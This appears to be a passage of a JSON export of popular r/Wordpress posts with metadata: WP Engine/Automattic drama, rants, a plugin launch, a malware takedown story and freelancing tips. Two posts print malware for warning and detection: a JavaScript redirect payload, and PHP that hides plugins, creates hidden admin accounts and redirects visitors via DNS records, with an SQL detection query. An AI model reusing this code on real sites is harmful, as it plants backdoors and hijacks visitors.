    "composite_score": 4.361238400567025
  },
  {
    "score": 329,
    "title": "Starting to think we fork this sub reddit if the mods are going to act like this. ",
    "selftext": "Bootlicker automatic is not appreciated. Stop locking posts that do not break the rules and do not update the rules to accommodate a narative(the natural next step of a mod loyal to a corpo). \n\nLet the community speak on what they want to speak about in relation to WordPress. I've been WordPress dev for 10+ years, people have a right to be concerned with WordPress right now and mods trying to control the conversation is bad for WordPress and our careers as WordPress devs. ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.85,
    "subreddit_type": "public",
    "ups": 329,
    "downs": 0,
    "created_utc": 1729460496.0,
    "media": null,
    "is_video": false,
    "num_comments": 127,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.65,
    "category_rationale": "Emotional critique of subreddit mods and call for community voice.",
    "composite_score": 4.209618924701822
  },
  {
    "score": 319,
    "title": "I Took Down a Malware Domain Used to Infect WordPress Sites",
    "selftext": "I reported and helped take down a malware domain infecting WordPress sites – streammain[.]top is down\n\nJust wanted to share a little victory (and encourage others to report abuse too):\n\nWhen I checked the payload at https://streammain[.]top/jsx, it contained this malicious redirect code:\n\nvar redirectTo = \"https://objq2[.]com/4/9250744\";\nvar a = document.createElement('a');\na.href = redirectTo;\na.setAttribute('rel','noreferrer');\ndocument.body.appendChild(a);\na.click();\n\nClearly malware, designed to redirect users to suspicious ad networks or potentially worse.\n\nReported the domain to the registrar (DomainContext)\n\nIncluded code, payload URL, IP (89.169.13[.]147), and screenshots\n\nGot a response: “Domain name was suspended” ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 319,
    "downs": 0,
    "created_utc": 1750891063.0,
    "media": null,
    "is_video": false,
    "num_comments": 33,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.58,
    "category_rationale": "Narrative about malware takedown with concrete reporting steps and example payloads.",
    "composite_score": 3.9983894368410335
  },
  {
    "score": 313,
    "title": "“Automattic will soon demand that agency partners must choose between doing business with WP Engine, or being cut off from the WordPress community“",
    "selftext": "Found in [new legal filing from WP Engine](https://storage.courtlistener.com/recap/gov.uscourts.cand.437474/gov.uscourts.cand.437474.17.0.pdf).\n\nThey also report a 29% drop in new customers, and a 17% increase in cancellations this month.\n\nEdit: Full quote from CEO of WP Engine:\n\n&gt;I have heard from multiple sources and understand that Defendants will soon demand that agency partners must choose between doing business with WPE, or doing business with Automattic, and if they chose WPE, they would similarly be cut off from the WordPress community by the Defendants. In the context of our business, an agency is an organization that builds websites, stores and publications on behalf of multiple clients, using WPE tools and products. Losing an agency relationship would mean that WPE would lose both the agency partner as well as many customers all at once. If Defendants carry out this threat, it will cause irreparable harm to our business in for form of lost customers and reputational harm. ([Source](https://storage.courtlistener.com/recap/gov.uscourts.cand.437474/gov.uscourts.cand.437474.21.0.pdf))",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 313,
    "downs": 0,
    "created_utc": 1729256868.0,
    "media": null,
    "is_video": false,
    "num_comments": 383,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.6,
    "category_rationale": "Explains a legal filing and its potential impact on WordPress ecosystem with cited details.",
    "composite_score": 4.52409526025698
  },
  {
    "score": 314,
    "title": "I hated WordPress. I was so stupid. Just wanted to share. [senior laravel / nodejs web dev]",
    "selftext": "This is insane. I just launched a whole working e-commerce in 4 hours. Everything is just so smooth. I can find a plugin for almost everything. And it costs $0.\n\nPayment gateway? Bang, its there. Traffic stats? Just clicked and I've got it. Integrate shipping? No problem, bang. I mean WHAT THE F\\*CK how is it even possible?!\n\nI remember dealing with WP some time ago and absolutely hated it. I was asked by my friend to do something with her website. I had no idea how to get things done and everything was just soooo slow.\n\nI usualy work on custom, specialized projects. I write advanced apps using Laravel, NuxtJS, ExpressJS etc. \n\nBut now I'm gonna be honest with you. For simple websites and on-line shops I feel like there is nothing even close as good as WP. No framework. I add a freaking page in 5 minutes lol. I use pre-made blocks and everything just looks good. I mean WHAT - THE - HEEEEELL man.\n\nThank you for your time.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.95,
    "subreddit_type": "public",
    "ups": 314,
    "downs": 0,
    "created_utc": 1719437931.0,
    "media": null,
    "is_video": false,
    "num_comments": 144,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.6,
    "category_rationale": "Personal emotional reflection contrasting past hate with current positive experience of WordPress.",
    "composite_score": 4.2914945549070875
  },
  {
    "score": 313,
    "title": "Is that poll pinned to the room a joke, or a troll, or both?  No comments allowed and no real choices to pick?  Ok, Matt.",
    "selftext": "If you are going to keep those two options, at least open the post up to discussion and comments.  You mention getting feedback but why hide it?  If you open the post up to discussion, I feel confident you will get some feedback, perhaps of the more tangible and substantive kind. I strongly believe feedback should be civil but surely you understand people's frustration at your little antics with this poll.\n\nMods, sometimes things don't go how you expect them to.  Matt expected this whole issue to blow up in WPE's face and that everyone would rally around him and leave WPE in droves.  Similarly, y'all expected this whole sub to blow up in our faces and that chaos would reign supreme for a week so that we would beg you to moderate us.  \n\nIt's ok to be wrong.  However, to then just decide you would rule with an iron fist anyway, that's kind of pathetic.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.96,
    "subreddit_type": "public",
    "ups": 313,
    "downs": 0,
    "created_utc": 1729006300.0,
    "media": null,
    "is_video": false,
    "num_comments": 172,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.68,
    "category_rationale": "Vent about moderation decisions and poll behavior with moral judgment.",
    "composite_score": 4.3359526996376125
  },
  {
    "score": 301,
    "title": "WP Engine Posts Complaint, Looks Like It's Court Time",
    "selftext": "You can find it [here](https://wpengine.com/wp-content/uploads/2024/10/Complaint-WP-Engine-v-Automattic-et-al-with-Exhibit.pdf).\n\nHere's what they are claiming:\n\n1. Intentional Interference with Contractual Relations;\n2. Intentional Interference with Prospective Economic Relations;\n3. Computer Fraud and Abuse Act, 18 U.S.C. § 1030 et seq.;\n4. Attempted Extortion;\n5. Unfair Competition, Cal. Bus. Prof. Code § 17200, et seq.;\n6. Promissory Estoppel;\n7. Declaratory Judgment of Non-Infringement;\n8. Declaratory Judgment of Non-Dilution;\n9. Libel;\n10. Trade Libel; and\n11. Slander.\n\nThe TLDR for what's in the filings:\n\n* Lawsuit appears to be against Automattic Inc., the company, and Matt personally\n* Pretty much everything that's been said in public over the last week or two is included (which is why you generally want to keep your mouth shut).\n* They want a jury trial\n* They claim the Stripe issue is basically a nothing-burger, the revenue is only $2k/mo\n* They claim Matt tried to poach Heather to Automattic, and when she didn't agree, he was going to make it public\n* They claim they didn't know about this for 18 months, as it was basically some type of hosting partnership at first\n* The claim the IRS wasn't properly informed of the trademark license transfer to the WordPress Foundation, as it's not listed in the Foundation filings",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 301,
    "downs": 0,
    "created_utc": 1727914752.0,
    "media": null,
    "is_video": false,
    "num_comments": 367,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.63,
    "category_rationale": "Summarizes legal complaint items and key points for readers.",
    "composite_score": 4.490430852293909
  },
  {
    "score": 304,
    "title": "New Malware Found in WordPress Installations: Hidden Admin Users, Redirects, and Plugin Hiding (Not Detected by 14 Major Scanners)",
    "selftext": "Hey everyone,\n\nI’ve come across a new type of malware that has infected several of our WordPress installations, and what’s concerning is that none of the security scanners we used, including Wordfence, [GOTMLS.NET](http://GOTMLS.NET), and about 12 others, were able to detect it. We tried all major tools, but none flagged this threat. It’s well hidden in the database, specifically in entries such as wpcode\\_snippets, siteurl, home, and redirection\\_options, and it uses advanced techniques to hide from both admins and security plugins.  \n**The websites  were compromised due to a weak password, not because of any security vulnerabilities in the plugins. They were all development websites under a test subdomain without indexing.**\n\nHere are some of the scanners we used that failed to detect the malware:\n\n* Wordfence\n* Sucuri SiteCheck\n* MalCare\n* iThemes Security\n* All In One WP Security &amp; Firewall\n* WPScan\n* Anti-Malware Security (by Eli/GOTMLS.NET)\n* SecuPress\n* Quttera Web Malware Scanner\n* Exploit Scanner\n* WPCore Scan\n* WP Cerber Security\n* ClamAV\n\nDespite using this wide range of scanners, none were able to identify the malicious code injected into the database. I’m sharing this here to alert the community and to see if anyone has encountered a similar issue or has insights on how to combat it.\n\n# Admin Panel Hijacking:\n\n* The malware modifies the admin interface by hiding specific security-related plugins (like \"Code Snippets\") and preventing the admin from reviewing compromised plugins and critical notifications.\n* Here’s a **code snippet** used to hide plugins:\n\n`if (current_user_can('administrator') &amp;&amp; !array_key_exists('show_all', $_GET)) {`\n\n`add_action('admin_print_scripts', function () {`\n\n`echo '&lt;style&gt;';`\n\n`echo '#toplevel_page_wpcode { display: none; }';`\n\n`echo '#wp-admin-bar-wpcode-admin-bar-info { display: none; }';`\n\n`echo '#wpcode-notice-global-review_request { display: none; }';`\n\n`echo '&lt;/style&gt;';`\n\n`});`\n\n`add_filter('all_plugins', function ($plugins) {`\n\n`unset($plugins['insert-headers-and-footers/ihaf.php']);`\n\n`return $plugins;`\n\n`});`\n\n`}`\n\n# Creation of Hidden Admin Users:\n\n* The malware reads cookie data to insert admin credentials into the database and creates hidden admin users, unknown to the actual site owner.\n* Here's an example of the code that creates hidden admin users:\n\n`if (!empty($_pwsa) &amp;&amp; _gcookie('pw') === $_pwsa) {`\n\n`switch (_gcookie('c')) {`\n\n`case 'au':`\n\n`$u = _gcookie('u');`\n\n`$p = _gcookie('p');`\n\n`$e = _gcookie('e');`\n\n`if ($u &amp;&amp; $p &amp;&amp; $e &amp;&amp; !username_exists($u)) {`\n\n`$user_id = wp_create_user($u, $p, $e);`\n\n`$user = new WP_User($user_id);`\n\n`$user-&gt;set_role('administrator');`\n\n`}`\n\n`break;`\n\n`}`\n\n`}`\n\n# Redirection of Non-Logged-In Users:\n\n* Non-logged-in users or visitors with certain IP addresses are redirected to malicious external URLs using DNS records.\n* Here’s the **redirect code**\n\n`function _red() {`\n\n`if (is_user_logged_in()) {`\n\n`return;`\n\n`}`\n\n`$ip = _user_ip();`\n\n`if (!$ip) {`\n\n`return;`\n\n`}`\n\n`$req = 'malicious-domain.com'; // Example of malicious domain being resolved`\n\n`$s = dns_get_record($req, DNS_TXT);`\n\n`if (is_array($s) &amp;&amp; !empty($s)) {`\n\n`$redirect_url = base64_decode($s[0]['txt']);`\n\n`if (substr($redirect_url, 0, 4) === 'http') {`\n\n`wp_redirect($redirect_url);`\n\n`exit;`\n\n`}`\n\n`}`\n\n`}`\n\n**IP and Session Tracking:**\n\n* The malware tracks IP addresses to avoid redirecting the same IP multiple times in a 24-hour period.\n\n# How We Found It:\n\nThe malware was hidden in the **wp\\_options** table, affecting entries like `wpcode_snippets`, `siteurl`, `home`, and `redirection_options`. It wasn’t detected by popular security plugins, including Wordfence.\n\nWe ran the following **SQL query** across all installations to identify suspicious patterns:\n\n`SELECT option_name, option_value`\n\n`FROM wp_options`\n\n`WHERE option_name IN ('siteurl', 'home', 'wpcode_snippets', 'wpseo', 'redirection_options')`\n\n`AND (option_value LIKE '%&lt;script%'`\n\n`OR option_value LIKE '%eval%'`\n\n`OR option_value LIKE '%base64_decode%'`\n\n`OR option_value LIKE '%document.write%');`\n\n# Observed Effects:\n\n* Non-logged-in users or visitors from unknown IPs are redirected to malicious sites.\n* Hidden admin users are created without the site owner’s knowledge.\n* Security plugins and important notifications are hidden from the admin panel.\n\n# What You Should Know:\n\n* This malware injects itself into database options like `wpcode_snippets` and `siteurl`, making it hard to detect via traditional scans.\n* The existing WordPress security plugins (including Wordfence) **did not detect** this malware.\n\n# What Can Be Done:\n\nIf you manage WordPress sites, I highly recommend checking your `wp_options` table for any suspicious values using the SQL query above. If anyone from the WordPress security community or plugin developers has encountered similar issues, I would love to collaborate on identifying how this malware propagates and how we can stop it.\n\nFeel free to reach out if you need more details or want to review the code in depth. I've attached the full script of the malicious code I found on injected as value the DB under a `wpcode_snippets` inside the `wp_option` table.\n\n**Be aware, the code contained in the file below is a malware, please do not install or copy this code in your eviroment for any reason.**\n\n[Malware Script sample](https://docs.google.com/document/d/1O0qxSaGkTglmekH-v-ZqpkikGfGSQpvBabeuAI1a4ZQ/edit?usp=sharing)\n\n**Update 1**:  \nI’ve written a script that temporarily helps to identify suspicious database entries related to this malware across multiple WordPress installations. The script scans through the directories where your WordPress installations are located, checks the `wp-config.php` file for database credentials, and then searches the database for signs of malicious code, particularly in the `wp_options` table.\n\n# How to Use the Scanner.php Script:\n\n1. **Download the script**: You can download the script from the link I’ve shared, or you can copy the code below.\n2. **2. Upload the script**:\n   * Place the script (called `scanner.php`) in the root folder where your WordPress installations are located, for example: `/home/youruser/public_html/`.\n3. **3. Run the script**:\n   * SSH into your server and run the script with the following command\n\n`php /path/to/scanner.php`\n\n* The script will log any suspicious entries found in the `wp_options` table of the database, printing details about the suspicious `option_name` and the first 300 characters of its `option_value`.\n* This script is a SCANNER, it will not clean your database nor remove the malware, it just tell you if and where is nested the malware.\n* If the results are suspicious, check the tables listed by the scanner, and remove malicious script, if it's the case, just delete the entire database entry that embedded the malware script.\n* **4. Don’t forget to reset all your credentials to ensure there are no compromised accounts:**\n* **This includes:**\n* WordPress admin passwords.\n* Database credentials (DB username and password).\n* FTP or SFTP credentials.\n* Hosting control panel passwords.\n* API keys or any third-party integration credentials.\n\n* **4. Remove the script after use**:\n   * Once the scan is complete, make sure to delete the `scanner.php` file from your public folder to avoid exposing it to potential attackers.\n\nThis is a temporary solution that should help you identify any infections while we wait for this malware to be incorporated into the official security tools.\n\n[Scanner file (php)](https://drive.google.com/file/d/1TNRw01vp8V-9CxDLMUw95j3RWmhf7W_I/view?usp=sharing)\n\nStay safe, and thanks for your attention!\n\n**Update 2:**\n\nEli from [GOTMLS.NET](http://GOTMLS.NET) and Julios from [SECUPRESS.ME](http://SECUPRESS.ME) replied:\n\nFull conversation here:  \n[https://wordpress.org/support/topic/new-malware-found-in-wordpress-installations-hidden-admin-users-redirects-and/#post-18010647](https://wordpress.org/support/topic/new-malware-found-in-wordpress-installations-hidden-admin-users-redirects-and/#post-18010647)\n\n**TL:DR**\n\nI’ve received some helpful feedback from the developers behind **SecuPress** and **GOTMLS** regarding this malware:\n\n* **Julio from SecuPress**: SecuPress is aware of this type of malware and has been working on improving their defenses. They’ve already developed methods to prevent hidden admin users from being inserted, whether via `wp_insert_user()`, custom `$wpdb` queries, or direct database injections. They’ve also found a way to always display hidden plugins on the admin plugins page and improved their **MalwareDB Scanner** to detect this type of malicious code. In the upcoming beta release (expected this month), these improvements will be implemented, and Julio has kindly offered for me to test this version early. Additionally, they’ve flagged the `custom-css-js` CPT slug as another potential location for injected redirect scripts.\n* **Eli from GOTMLS**: Eli mentioned that he has seen similar threats where the **WPCode Lite** plugin is installed, and malicious code snippets are injected into the database to hide from the WordPress admin area. He confirmed that different sites were compromised using a mix of brute force attacks and unpatched plugin vulnerabilities. Eli also confirmed that this malware variant was added to his **GOTMLS** definitions on the 7th of last month, but he’s unsure why it wasn’t detected on my site, despite having the latest definitions. He has asked for me to send him the exact code found in my database for further investigation.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 304,
    "downs": 0,
    "created_utc": 1726134734.0,
    "media": null,
    "is_video": false,
    "num_comments": 120,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.64,
    "category_rationale": "Security alert describing new malware and detection limitations with detailed context.",
    "composite_score": 4.260692524505012
  },
  {
    "score": 297,
    "title": "Free agentic AI plugin developer right inside WP",
    "selftext": "I have updated my plugin that can create, fix, and extend other plugins with AI. Now it can create complex, multi-file plugins from simple descriptions. It is completely free and open-source (no premium version, no ads, no account required), and it works with \\*any\\* AI platform and model, including free-to-use SOTA models like Gemini 2.5 Pro, Mistral Large, DeepSeek R1, etc.\n\nWith the new version we can define different models for each task (planning, coding, reviewing). It also shows a detailed breakdown of the token usage.\n\nI'm open to feedback, bug reports, and feature ideas :)\n\nYou can download it from GitHub: [https://github.com/WP-Autoplugin/wp-autoplugin/](https://github.com/WP-Autoplugin/wp-autoplugin/)",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.92,
    "subreddit_type": "public",
    "ups": 297,
    "downs": 0,
    "created_utc": 1756036242.0,
    "media": null,
    "is_video": false,
    "num_comments": 101,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.66,
    "category_rationale": "Announcement of an AI plugin tool and its capabilities with a download link.",
    "composite_score": 4.168516349957215
  },
  {
    "score": 297,
    "title": "Am I the only one who's been absolutely fine with the \"hands off\" mod policy? ",
    "selftext": "Title. Still have been able to read and talk about WordPress. There haven't been a ton of posts, a lot of the drama posts have been downvoted and stay out of my feed. And tbh I haven't noticed any spam at all?? \n\nBefore the mods kinda quit and did a 'strike' or whatever tf there were the exact same amount of posts about the software WordPress and their scores had the exact same scores. Like letting the community moderate what topics they want to be popular VS not seems to have gone just fine.\n\nAnd taking away the option to vote for the \"drama\" posts to stay honestly just comes off as childish to me. Give us the option in the poll so it's truly representative of what the community wants LMAO. ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.96,
    "subreddit_type": "public",
    "ups": 297,
    "downs": 0,
    "created_utc": 1729001695.0,
    "media": null,
    "is_video": false,
    "num_comments": 100,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.72,
    "category_rationale": "Opinionated critique of hands-off moderation and desire for representative polling.",
    "composite_score": 4.196376950967577
  },
  {
    "score": 295,
    "title": "An open letter to Matt Mullenweg",
    "selftext": "Dear Matt (/u/photomatt),\n\nWith your words, you’ve said that everything you’re doing is for the good of WordPress and FOSS. Your actions, however, tell a very different story.\n\nI want to give you the benefit of the doubt and assume that you are not acting in bad faith or deliberately being duplicitous. I want to believe you genuinely think you’re doing what’s best for the WordPress and FOSS communities. But if that’s the case, it’s time to pause, step back, and listen—because your actions increasingly run counter to WordPress’ mission, the GPL’s four freedoms, and the values of the community.\n\nWordPress.org’s mission emphasizes accessibility, inclusivity, and democratizing publishing. It declares that WordPress is “designed for everyone” and is built by a global community of contributors who have “dedicated countless hours to build a tool that offers anyone a voice.” Similarly, the GPL’s four freedoms safeguard users’ rights to run, study, modify, and share the software.\n\nBut your recent decisions—whether it’s reducing Automattic’s contributions, unchecked conflicts of interest, or unilateral actions like adding divisive checkboxes—undermine these principles. Instead of fostering accessibility, transparency, and collaboration, your actions sow division, uncertainty, and distrust within the community.\n\nYour erratic behavior and unpredictable decisions—paired with Automattic’s outsized influence over WordPress.org and the ecosystem—jeopardize not only the community but also the millions of websites and organizations built on WordPress.\n\nYour recent decision to reduce Automattic’s contributions raises serious concerns. You’ve cited legal battles and community criticism as reasons, but these feel more like excuses than valid justifications. Automattic’s financial position is strong—valued at $7.5 billion with over $700 million in revenue in 2024—and reducing contributions now seems less like a necessity and more like a withdrawal.\n\nAs a nonprofit professional, I deeply understand financial and resource constraints. WordPress has been a vital tool for us, enabling affordable, flexible websites that help drive our mission forward. Many nonprofits worldwide rely on WordPress to connect with communities, raise funds, and create positive change. However, instability in WordPress’ ecosystem threatens their ability to do this.\n\nYour role at the center of the WordPress ecosystem—holding control over WordPress.org, leading Automattic, and directing the WordPress Foundation—only amplifies the risks. Any instability caused by your decisions ripples across millions of websites, including those of nonprofits that can least afford disruptions. These organizations, which depend on WordPress to serve their communities, are already stretched thin. Instability or additional barriers could potentially cripple their operations.\n\nAs the IT Manager for a small nonprofit managing four WordPress websites, I’ve started looking for alternatives. I worry about your unchecked control over plugins, wordpress.org, or the project itself. I know I’m not alone in this concern.\n\nYour actions seem increasingly at odds with WordPress’ mission and the GPL’s freedoms. If WordPress is truly “designed for everyone” and built to “democratize publishing,” then it must be guided by a collaborative, inclusive, and stable vision—not one that centers around a single company or individual.\n\nIf you genuinely care about WordPress, its community, and its principles, it’s time to critically reevaluate your actions and their impact. It’s time to step back and empower others to lead. The WordPress project is far bigger than any one person, and its future depends on honoring the mission and freedoms that have made it a cornerstone of the internet.\n\nFor the good of WordPress, its users, and its future: listen to the community.\n\nSincerely,\nA concerned IT Manager and WordPress user",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.9,
    "subreddit_type": "public",
    "ups": 295,
    "downs": 0,
    "created_utc": 1736539260.0,
    "media": null,
    "is_video": false,
    "num_comments": 92,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.85,
    "category_rationale": "Open letter strongly criticizing Matt Mullenweg and urging pause and accountability.",
    "composite_score": 4.130533185335906
  },
  {
    "score": 295,
    "title": "6 things that will make your life easier as a freelance web dev",
    "selftext": "I'm gonna make this as quick as possible. I'm actually doing a long post like this for another place, but I'll publish the shorter, no-bullshit version here. Excuse my English, but boy, do I wish I'd read something like this 5 years ago. I'm sure most never had these problems, but I did. It doesn't matter how good of a developer or designer you are. Being a freelancer with no business skills (or business logic) is a recipe for disaster.\n\n# Intro:\n\nI've been doing websites for clients for the past 5 years. Three of those years were a worthless time of my life I'll never get back. I worked 12 hours a day including weekends and holidays, and I had nothing to show for it except a big portfolio of projects.\n\nIf I had to do everything again from scratch, it would take me a year or less and I wouldn't lose 3+ years down the toilet.\n\nI know this is probably basic stuff to most people. But it wasn't basic to me because I was a dumb business owner.\n\n# 1. Don’t Be Cheap\n\nBeing cheap is a perfect scenario to become overworked while staying poor. Cheap clients, in my experience, are the worst. They only look for the cheapest option and always expect too much. None of them want to admit or accept that you can’t perform miracles for cheap rates and below every possible hourly rate that keeps you fed and financially stable.\n\nCheap clients bring zero value in the long run. Sure, some money is better than no money if you’re struggling, but let me say this again: cheap clients are worthless.\n\nThe best flow of clients you can get is through recommendations. For cheap clients, you'll only ever be the “I know a dude who’s cheap.” The leads they bring will always be useless because they will also go for the cheapest option out there. If you charge more, you’ll be the “I know a guy who does a great job.” That’s a big difference in the quality of leeds. Whenever I get a lead from one of my past cheap clients, they get a heart attack when I'm telling them my price although I'm still cheap.\n\nThe only reason for you to be cheap is if you are just starting out and need to build your portfolio, or if you are doing a project for family and friends. But that’s about it. If your work is bad and you can only get cheap clients because of that, you’re doomed to stay stressed out while making zero career progress.\n\nIt’s not just having a food on the table. More money means more money to invest, improve, and get your business and work to the next level. If you’re only working to pay your bills, you can’t improve. You can’t buy the Shutterstock/AI/fancy plugin subscriptions, you can’t buy software that would make your life easier, you can’t buy a new PC, and you’re stuck with outdated equipment.\n\nDon’t get me wrong. You can’t charge $50k for a landing page with 3 sections either. But respect your hourly rate that keeps you fed and be real with yourself when calculating how many hours a project will take.\n\n# How to Set Your Hourly Rate:\n\nBe honest with yourself. You can’t grind 12 hours a day. There are only 5 hours of intense work you can do in a day in the long run. Sure I was busting my balls for 12 hours a day at the start, but believe me when I say that it took the toll on me. The rest of the time is talking to dead leads, dealing with bureaucracy, keeping your things in order, following the important news, etc. So effective work is 5 hours a day. Take into account vacations, sick leave, and everything else, and you’ll most likely realize what your hourly rate needs to be.\n\n# 2. Offer Maintenance\n\nThe business of building websites is a mess. If you live from project to project, you are in a loop of constantly looking for new leads, and you need to finish X projects per month to stay afloat. Shit happens, and there will be times when you don’t have new leads for a month or more.\n\nTo prevent this, you need to upsell maintenance packages. I met a guy who lives comfortably as a web designer/dev. Half of his income comes from maintenance packages alone.\n\nWe all know that shit happens. Things go south, and the last thing you want is for it to be your problem to solve for free.\n\nHere’s an example: You delivered a project to a client 2 years ago and they have no maintenance package. They paid you a single invoice and that's it. Suddenly, they call you, say that the website is broken, and that it’s your job to fix it for free because they paid for a functional website 2 years ago and they expect it to be functional for the next 20 years.\n\nWhen you analyze the situation, you find out that their entire low-budget server got hacked, their data got erased, and the only thing you can do is a full rebuild and charge the client again the full price. Maybe you offer a 50% discount, but this will destroy your hourly rate and set you back to the level of a student who just learned to install WP two days ago. No client would be happy with this proposal, and they’ll blame you for their issues. They will probably move to another web dev, write you a bad review on Google My Business and they're gonna keep telling their own (false) version of the story of their experience with you whenever they talk with someone about web design.\n\nMaintenance prevents all of this.\n\n* Regular backups keep the data safe when things go wrong. MainWP/Vivid PRO combo is great for this.\n* Regular system updates (plugins if you’re using WP) prevent vulnerabilities (follow Wordfence news, prioritize updating whatever is vulnerable through MainWP).\n* Testing the site after each update is a must to see if something went wrong during the update process. If something becomes incompatible, it's your job to fix the code and solve the issues. It’s part of the maintenance.\n* Priority support. When you're overloaded with work, it's gonna be easier (and neccessary) to offer priority support for those who pay maintenance packages.\n\nMy maintenance packages also include ability for the client to talk with me through Whatsapp/Viber, call me on weekends (only a few those with big enough maintenance packages), and so on. Some clients appreciate support like this and they easily see the value in it.\n\nDepending on the functionalities of the website, you can adjust your rates for maintenance packages for each client. A small static website doesn’t need many updates or maintenance. Update the system twice a year, do one backup per year, and that’s it. The price can easily be equivalent to 4 hours of your time because maintenance in this case won’t take more than that. If you have 10 of those small website maintenance packages, you’ve got a week of your time covered.\n\nA big store that has 100+ orders per day needs backups done daily. Because every downtime translates to a big loss of revenue, you of course need to do updates on a test environment first. These things require time, so charge accordingly. For these kinds of projects, you can easily charge 40 hours of your time per year. If you have 8 of those clients, you’ve got 2 months covered. That’s 2 months less searching for new clients next year.\n\nNow imagine having a mix of maintenance packages. 10 clients on the highest package, 40 on the smallest packages, and 30 somewhere in between (dynamic sites with weekly backups, monthly updates). This easily covers almost half of your time. Call it a “maintenance Wednesday” and life becomes easier.\n\nThis was all just technical maintenance. If your clients want you to write blog posts, run the social media account, or whatever, this is something custom you can offer as well.\n\nBut for the love of god, charge your maintenance packages for a year upfront. The worst thing in the world is to hunt clients each month because they forgot or are unwilling to pay.\n\n# 3. Demand Payment Upfront\n\nDemanding payment upfront is an industry standard. Not only does it protect you from not being paid at all, but it also keeps the client in check. Because let’s be real. Here are some of the quite popular excuses you’re surely gonna hear in the middle of some projects when you’ve already spent tens of hours on them:\n\n* \"Sorry, but we decided that we don’t need a website anymore (so we won’t pay you).\"\n* \"We just found out that our boss has a cousin who does websites as well, so we're gonna hand the project over to him (so we won’t pay you).\"\n* \"We lost funding we needed for the project, so we are canceling it immediately (so we won’t pay you).\"\n\nThis happens more often than you think. With partial payment upfront, you are safe from not being paid at all. But that’s not all.\n\nThe other thing is that 50% upfront keeps the client motivated to finish the project. There are tons of clients who become slow to respond to your questions and requests in the middle of the project. A project that would take 1 week becomes a 3+ month journey, and your hourly rate goes down the toilet.\n\nWhen clients pay 50% upfront, they are more motivated to finish the project sooner because it’s not just your time on the line anymore, but their money as well. “We paid 50%, let’s make sure they deliver” thoughts come into effect, and the client will be more responsive and you’ll be able to finish the project sooner.\n\n# 4. Charge for Everything\n\nI was dumb for not doing this in the first few years. But you need to charge for everything. Every time you work on something for a client, your time needs to be paid. You are a business and you can’t pay your bills with thank yous.\n\nMany clients never believe that the project is ever finished and expect you to work on upgrades and minor fixes indefinitely for free. If you don’t enforce being paid for your time once the project is finished, nothing prevents them from asking you to work for them free of charge over and over again.\n\nIf you’re like me and have 40 clients calling and emailing you each month to do things you never agreed to, you need to stop it right now and charge for everything. Clients will either stop bugging you (you’ll profit time), or they’ll start paying and you’ll profit money.\n\nWhen I started enforcing being paid for everything extra, a client actually told me, “Finally, you should have been charging us for months already.”\n\nI'm not saying you need to charge every 30-second work as well. But always do the calculation of what would happen if all of the 100 of your clients needed the same thing in a month. Would you still be profitable or would you work for 100 hours for free?\n\n# 5. Don’t Deliver Unless You’re Paid\n\nEven though you demand 50% upfront, there are still clients out there who would love to scam you for the other 50%. To protect yourself from this, don’t deliver until you’re paid in full.\n\nAn example of this kind of situation would be when clients think your website will bring them millions of revenue in a heartbeat. Maybe they don’t even have the money to pay you in the first place but expect to get the needed revenue after you deliver. This is not how this works, so you have to avoid getting scammed.\n\nLock the website up (so they can’t run ads on it) until it’s paid. Block it from Google and search engines, and don’t move it from your test environment to their server. Once the bill is paid, finish it up.\n\n# 6. Use Proposals and Contracts\n\nBefore you even lift a finger for a client’s project, you need to have a contract in place. Otherwise, you can end up in an endless loop of demands that will destroy your hourly rate.\n\nImagine this: You get a call from a prospect who wants a website. Their demands are “I just want a very simple website, nothing extraordinary.” It’s a simple project with a few contact forms, some static content, a sticky header, and that’s it. You set up a price you believe is right for 20 hours of your time and you can immediately start working on the project, expecting it will all be done in a few days.\n\nBut then during the process, the client starts demanding more. Lots of custom solutions, a booking system, Stripe integration, whatever. And if you don’t agree that that’s your job for the agreed price, you have nothing to back it up. The client doesn’t remember the small talk over the phone when they said they want a simple website. If you don’t want to do the extra work, the client can walk away and you’ve lost days of your time. If you grind it out, the project doesn’t take 20 hours to be finished, but 60. Your hourly rate decreases by 66% and you basically got screwed over.\n\nHere’s how my proposal system works:\n\nI talk with the prospect extensively to see what they want, what they need, and I ask them over 10 questions.\n\nOnce they reply, I write EVERYTHING I’m offering for their project.\n\nMy contract for a website design usually includes:\n\n* Unique design based on client’s wishes and my recommendations\n* List of tools/software I’m going to use\n* Expected deadline (which starts only when the client sends me every piece of needed material and agrees on the design draft)\n* Domain and hosting details – who pays them and what’s the renewal cost\n* Number of unique pages (Homepage, About us, Contact, Team, Service)\n* Wireframe of their website\n* Functionality (contact forms, booking form, store, payment processors integrations, Google Maps integration…)\n* Number of articles/products I’m willing to publish on their site myself\n* Blog/news functionality\n* Video tutorial on how to publish and edit the news section\n* GA and GWT integration\n* Basic onsite SEO optimization\n* How much time after the project delivery I’m willing to work on small edits and fixes\n* What kind of maintenance comes with my offer (1 year upfront)\n* Etc.\n\nOnce my proposal is finished, I send it over to the prospect. I ask them to confirm my offer via email. This way I have it all written down and the client knows exactly what they agreed to. This way I have all the proof I need in case the client starts demanding more in the process.\n\nIt’s not a problem to do extra work for any client. But when it’s not something that was agreed to and it’s gonna take me 